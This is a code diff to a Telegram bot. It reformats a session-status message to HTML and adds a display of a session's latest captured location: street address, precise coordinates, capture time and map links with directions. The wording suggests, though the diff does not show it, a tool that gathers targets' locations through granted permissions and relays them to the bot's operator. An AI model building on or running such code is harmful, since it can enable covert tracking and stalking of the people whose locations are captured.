@@ -222,23 +222,78 @@ bot.action(/^status_(.+)$/, async (ctx) => {
         
         let mediaInfo = '';
         if (session.mediaCounts && Object.keys(session.mediaCounts).length > 0) {
-            mediaInfo = '\n\n📊 *Data Received:*\n';
+            mediaInfo = '\n\n📊 <b>Data Received:</b>\n';
             for (const [type, count] of Object.entries(session.mediaCounts)) {
                 mediaInfo += `  • ${type}: ${count}\n`;
             }
         }
         
-        await ctx.reply(
-            `📋 *Session Status*\n\n` +
-            `*Status:* ${statusEmoji[session.status] || '⚪'} ${session.status.toUpperCase()}\n` +
-            `*Type:* ${config.permissions[session.permissionType]?.label || session.permissionType}\n` +
-            `*Created:* ${new Date(session.createdAt).toLocaleString()}\n` +
-            `*Expires:* ${new Date(session.expiresAt).toLocaleString()}` +
-            (session.activatedAt ? `\n*Activated:* ${new Date(session.activatedAt).toLocaleString()}` : '') +
-            (session.endedAt ? `\n*Ended:* ${new Date(session.endedAt).toLocaleString()}` : '') +
-            mediaInfo,
-            { parse_mode: 'Markdown' }
-        );
+        // Build status message
+        let statusMessage = 
+            `📋 <b>Session Status</b>\n\n` +
+            `<b>Status:</b> ${statusEmoji[session.status] || '⚪'} ${session.status.toUpperCase()}\n` +
+            `<b>Type:</b> ${config.permissions[session.permissionType]?.label || session.permissionType}\n` +
+            `<b>Created:</b> ${new Date(session.createdAt).toLocaleString()}\n` +
+            `<b>Expires:</b> ${new Date(session.expiresAt).toLocaleString()}` +
+            (session.activatedAt ? `\n<b>Activated:</b> ${new Date(session.activatedAt).toLocaleString()}` : '') +
+            (session.endedAt ? `\n<b>Ended:</b> ${new Date(session.endedAt).toLocaleString()}` : '') +
+            mediaInfo;
+        
+        await ctx.reply(statusMessage, { parse_mode: 'HTML' });
+        
+        // If it's a location session, also show the last location with full details
+        if (session.permissionType === 'location' && session.mediaCounts?.location > 0) {
+            try {
+                const locationsResult = await api.getSessionLocations(sessionId);
+                
+                if (locationsResult.success && locationsResult.locations.length > 0) {
+                    // Get the most recent location
+                    const latestLocation = locationsResult.locations[locationsResult.locations.length - 1];
+                    const loc = latestLocation.data;
+                    
+                    let locationMessage = `\n📍 <b>LATEST LOCATION</b>\n\n`;
+                    
+                    // Address
+                    if (loc.address) {
+                        locationMessage += `📌 <b>Address:</b>\n${loc.address.formatted || loc.address.displayName}\n\n`;
+                        
+                        if (loc.address.street) locationMessage += `🏠 Street: ${loc.address.street}\n`;
+                        if (loc.address.neighborhood) locationMessage += `🏘️ Area: ${loc.address.neighborhood}\n`;
+                        if (loc.address.city) locationMessage += `🌆 City: ${loc.address.city}\n`;
+                        if (loc.address.state) locationMessage += `🗺️ State: ${loc.address.state}\n`;
+                        if (loc.address.country) locationMessage += `🌍 Country: ${loc.address.country}\n`;
+                        if (loc.address.postalCode) locationMessage += `📮 Postal: ${loc.address.postalCode}\n`;
+                        locationMessage += `\n`;
+                    }
+                    
+                    // Coordinates
+                    if (loc.coordinates) {
+                        locationMessage += `🎯 <b>Coordinates:</b>\n`;
+                        locationMessage += `├ Lat: <code>${loc.coordinates.latitude?.toFixed(6)}</code>\n`;
+                        locationMessage += `├ Lng: <code>${loc.coordinates.longitude?.toFixed(6)}</code>\n`;
+                        if (loc.coordinates.accuracy) locationMessage += `├ Accuracy: ${loc.coordinates.accuracy.toFixed(1)}m\n`;
+                        locationMessage += `\n`;
+                    }
+                    
+                    // Timestamp
+                    locationMessage += `🕐 <b>Captured:</b> ${new Date(latestLocation.timestamp).toLocaleString()}\n\n`;
+                    
+                    // Maps links
+                    if (loc.maps) {
+                        locationMessage += `🗺️ <b>View on Maps:</b>\n`;
+                        locationMessage += `<a href="${loc.maps.googleMaps}">📍 Open in Google Maps</a>\n`;
+                        locationMessage += `<a href="${loc.maps.googleMapsDirections}">🧭 Get Directions</a>`;
+                    }
+                    
+                    await ctx.reply(locationMessage, { 
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false
+                    });
+                }
+            } catch (locError) {
+                logger.error('Failed to get locations', { error: locError.message });
+            }
+        }
         
     } catch (error) {
         logger.error('Failed to get session status', {
